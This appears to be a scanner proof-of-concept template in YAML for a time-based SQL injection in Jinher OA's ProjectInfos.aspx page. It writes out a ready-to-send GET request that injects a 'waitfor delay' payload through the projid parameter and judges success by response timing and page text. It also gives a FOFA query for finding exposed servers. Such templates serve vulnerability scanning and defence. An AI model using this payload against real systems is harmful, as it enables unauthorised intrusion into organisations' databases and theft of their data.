id: poc-yaml-jinher-jhsoft-projectinfos-aspx-sqli
info:
  name: 金和OA ProjectInfos.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /c6/JHSoft.Web.CostControl/BudgetExecution/ProjectInfos.aspx/?projid=1;waitfor+delay%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"项目明细信息") &&

    contains(gbk_decode(body),"项目扩展信息") &&

    contains(gbk_decode(body),"所属部门") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
